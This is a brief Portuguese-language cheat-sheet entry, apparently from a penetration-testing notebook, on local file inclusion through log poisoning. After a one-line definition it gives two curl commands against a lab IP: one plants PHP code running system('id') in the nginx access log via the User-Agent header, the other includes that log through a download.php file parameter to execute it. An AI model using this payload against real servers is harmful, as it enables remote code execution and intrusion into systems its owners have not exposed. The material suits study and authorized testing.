# LFI (Log Poisoning)

Vuln onde dados maliciosos são inseridos em arquivos de log, o que pode permitir exec de código remoto.&#x20;

```
curl http://10.10.0.4 -H "User-Agent: <?php system('id');?>"  
```

```
curl "http://10.10.0.4/download.php?fid=/var/log/nginx/access.log"
```

